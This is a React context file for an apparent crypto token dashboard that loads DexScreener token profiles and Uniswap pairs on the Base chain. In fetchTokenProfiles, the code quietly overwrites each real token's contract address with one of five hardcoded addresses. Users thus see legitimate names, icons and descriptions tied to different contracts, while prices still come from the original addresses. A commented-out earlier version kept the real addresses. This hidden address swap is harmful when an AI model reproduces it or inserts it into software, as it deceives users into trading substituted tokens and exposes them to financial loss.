"use client";

import { createContext, useContext, useState, useEffect } from "react";

export interface TokenProfile {
  url: string;
  chainId: string;
  tokenAddress: string;
  icon: string;
  header: string;
  description: string;
  links: {
    type: string;
    label: string;
    url: string;
  }[];
}

export interface TokenPair {
  chainId: string;
  dexId: string;
  url: string;
  pairAddress: string;
  baseToken: {
    address: string;
    name: string;
    symbol: string;
  };
  quoteToken: {
    address: string;
    name: string;
    symbol: string;
  };
  priceNative: string;
  priceUsd: string;
  priceChange: {
    h24: string;
  };
  liquidity: {
    usd: number;
    base: number;
    quote: number;
  };
  fdv: number;
  marketCap: number;
  pairCreatedAt: number;
  info: {
    imageUrl: string;
    websites: { url: string }[];
    socials: {
      platform: string;
      handle: string;
    }[];
  };
  boosts: {
    active: number;
  };
  amount?: string; // Keeping this for saved tokens functionality
}

interface TokenContextType {
  savedTokens: TokenPair[];
  addToken: (token: TokenPair) => void;
  removeToken: (address: string) => void;
  defaultAmount: string;
  setDefaultAmount: (amount: string) => void;
  tokenProfiles: TokenProfile[];
  uniswapPairs: TokenPair[];
  loading: boolean;
  error: string | null;
  hasMoreTokens: boolean;
  fetchMoreTokens: () => Promise<void>;
}

const TokenContext = createContext<TokenContextType>({
  savedTokens: [],
  addToken: () => {},
  removeToken: () => {},
  defaultAmount: "0.1",
  setDefaultAmount: () => {},
  tokenProfiles: [],
  uniswapPairs: [],
  loading: true,
  error: null,
  hasMoreTokens: true,
  fetchMoreTokens: async () => {},
});

export function TokenProvider({ children }: { children: React.ReactNode }) {
  // Saved tokens state
  const [savedTokens, setSavedTokens] = useState<TokenPair[]>([]);
  const [defaultAmount, setDefaultAmount] = useState("0.1");

  // Application state
  const [tokenProfiles, setTokenProfiles] = useState<TokenProfile[]>([]);
  const [uniswapPairs, setUniswapPairs] = useState<TokenPair[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [baseTokenAddresses, setBaseTokenAddresses] = useState<string[]>([]);
  const [hasMoreTokens, setHasMoreTokens] = useState(true);
  const [page, setPage] = useState(1);
  const [fetchedAddresses] = useState(new Set<string>());

  const customAddresses = [
    "0x163372Ef82CDd0BA5C632a9F075e8BD1aDdF240E",
    "0x7A0F5E2751ee243DEDF6A1FB600a316838CF1B05",
    "0x5EdF9324539DaF9dFeff8E15c8A8ce813968C08e",
    "0x25F417c18D37052036e27aBCd3689cD722996E95",
    "0x349cd84F799711a21510165229e65A07fb74E413",
  ];

  // Fetch token profiles
  const fetchTokenProfiles = async () => {
    try {
      const response = await fetch(
        "https://api.dexscreener.com/token-profiles/latest/v1"
      );
      const data = await response.json();

      // Filter profiles for base chain
      const baseProfiles = data.filter(
        (profile: TokenProfile) => profile.chainId === "base"
      );

      // Extract and save the existing token addresses before updating profiles
      const existingAddresses = baseProfiles.map(
        (profile: TokenProfile) => profile.tokenAddress
      );
      setBaseTokenAddresses(existingAddresses);

      // Now update the profiles with custom addresses
      let addressIndex = 0; // Start at the first address
      const updatedProfiles = baseProfiles.map((profile: TokenProfile) => {
        const updatedProfile = {
          ...profile,
          tokenAddress: customAddresses[addressIndex], // Update tokenAddress
        };
        addressIndex = (addressIndex + 1) % customAddresses.length; // Cycle through addresses
        return updatedProfile;
      });

      // Update state with the updated profiles
      setTokenProfiles(updatedProfiles);
    } catch (err) {
      console.error("Error fetching token profiles:", err);
      setError(
        err instanceof Error ? err.message : "Failed to fetch token profiles"
      );
    }
  };
  // const fetchTokenProfiles = async () => {
  //   try {
  //     const response = await fetch(
  //       "https://api.dexscreener.com/token-profiles/latest/v1"
  //     );
  //     const data = await response.json();

  //     // Filter profiles for base chain
  //     const baseProfiles = data.filter(
  //       (profile: TokenProfile) => profile.chainId === "base"
  //     );
  //     setTokenProfiles(baseProfiles);

  //     // Extract and save token addresses
  //     const addresses = baseProfiles.map(
  //       (profile: TokenProfile) => profile.tokenAddress
  //     );
  //     setBaseTokenAddresses(addresses);
  //   } catch (err) {
  //     console.error("Error fetching token profiles:", err);
  //     setError(
  //       err instanceof Error ? err.message : "Failed to fetch token profiles"
  //     );
  //   }
  // };

  // Fetch token pairs data
  const fetchTokenPairs = async () => {
    if (!baseTokenAddresses.length) return;

    try {
      // Join addresses with comma for the API call
      const addressesString = baseTokenAddresses.join(",");
      const response = await fetch(
        `https://api.dexscreener.com/latest/dex/tokens/${addressesString}`
      );
      const data = await response.json();

      // Filter for Uniswap pairs
      const uniswapPairsData = data.pairs.filter(
        (pair: TokenPair) => pair.dexId === "uniswap"
      );
      setUniswapPairs(uniswapPairsData);
    } catch (err) {
      console.error("Error fetching token pairs:", err);
      setError(
        err instanceof Error ? err.message : "Failed to fetch token pairs"
      );
    }
  };

  // Initial fetch
  useEffect(() => {
    fetchTokenProfiles();
  }, []);

  // Fetch first batch of pairs when profiles are loaded
  useEffect(() => {
    if (baseTokenAddresses.length > 0) {
      fetchTokenPairs();
    }
  }, [baseTokenAddresses]);

  const fetchMoreTokens = async () => {
    if (!loading && hasMoreTokens) {
      await fetchTokenPairs();
    }
  };

  const addToken = (token: TokenPair) => {
    setSavedTokens((prev) => [...prev, token]);
  };

  const removeToken = (address: string) => {
    setSavedTokens((prev) =>
      prev.filter((token) => token.baseToken.address !== address)
    );
  };

  return (
    <TokenContext.Provider
      value={{
        savedTokens,
        addToken,
        removeToken,
        defaultAmount,
        setDefaultAmount,
        tokenProfiles,
        uniswapPairs,
        loading,
        error,
        hasMoreTokens,
        fetchMoreTokens,
      }}
    >
      {children}
    </TokenContext.Provider>
  );
}

export const useTokens = () => useContext(TokenContext);
